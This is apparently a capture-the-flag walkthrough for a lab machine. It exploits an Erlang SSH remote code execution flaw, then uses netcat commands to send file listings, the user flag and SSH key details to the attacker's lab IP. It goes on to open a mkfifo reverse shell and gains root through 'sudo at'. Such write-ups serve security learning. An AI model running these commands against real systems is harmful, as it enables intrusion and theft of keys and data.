`nmap -A -T4 -p- 10.129.232.1`

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-23 13:28 EDT
Nmap scan report for 10.129.232.1
Host is up (0.043s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.58
|_http-title: Did not follow redirect to http://powerlang.htb/
|_http-server-header: Apache/2.4.58 (Ubuntu)
2222/tcp open  ssh     (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-Erlang/5.2.9
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port2222-TCP:V=7.95%I=7%D=5/23%Time=6830B056%P=x86_64-pc-linux-gnu%r(NU
SF:LL,16,"SSH-2\.0-Erlang/5\.2\.9\r\n");
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: Host: 127.0.1.1
```

Update host files and start enumerating.

![](Images/Pasted%20image%2020250523133158.png)

Erlang is vulnerable to an RCE which can be found [here](https://github.com/ProDefense/CVE-2025-32433)

We had to make some adjustments to the POC after running it once and not getting a shell.

![](Images/Pasted%20image%2020250523135250.png)

Update our Target IP and port and then we can adjust our payload to be a simple reverse shell (I had ran the test once which could've created lab.txt)

![](Images/Pasted%20image%2020250523135310.png)

Setup a listener on 4444 and catch the shell after running the POC.

![](Images/Pasted%20image%2020250523135534.png)

![](Images/Pasted%20image%2020250523135542.png)

So it doesn't appear to be an interactive shell but a ways to enumerate. So we can read local files this way.

We can change out payload to be to list out local directories for enumeration.

```
command='os:cmd("dir | nc 10.10.14.21 4444").'
```

![](Images/Pasted%20image%2020250523135836.png)

Lets read the user flag next.
```
command='os:cmd("cat user.txt | nc 10.10.14.21 4444").'
```

![](Images/Pasted%20image%2020250523135909.png)

Next we can grab look into the SSH key directory and find the keys used for SSH

```
command='os:cmd("dir ssh_system | nc 10.10.14.21 4444").'
```

![](Images/Pasted%20image%2020250523140020.png)

We will grab the `ssh_host_rsa_key` next in order to establish a session hopefully.

![](Images/Pasted%20image%2020250523140224.png)

After getting the key it still requires a username to pass lets see if we can enumerate the directory further to find a user.

![](Images/Pasted%20image%2020250523140434.png)

After sending a pwd it appears we are the user it-operator lets try and use that with the key.

![](Images/Pasted%20image%2020250523140549.png)

Still requires a password....

Some further enumeration shows us that SSH is basically not allowed via standard authentication

![](Images/Pasted%20image%2020250523141253.png)

Since I can't SSH I will try and get a shell rather than manually enumerating files.

```
command='os:cmd("rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.21 4444 > /tmp/f").'
```

Gets us a shell

![](Images/Pasted%20image%2020250523141726.png)

![](Images/Pasted%20image%2020250523141735.png)

Looks like quick escalation via Sudo binary [here](https://gtfobins.github.io/gtfobins/at/)

Since we have no TTY it appears to break our shell so I will try and execute the binary as root when generating the initial shell.

```
command = 'os:cmd("echo \'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.21 4444 > /tmp/f\' | sudo at now").'
```

Which gets us a root shell

![](Images/Pasted%20image%2020250523142141.png)

![](Images/Pasted%20image%2020250523142157.png)

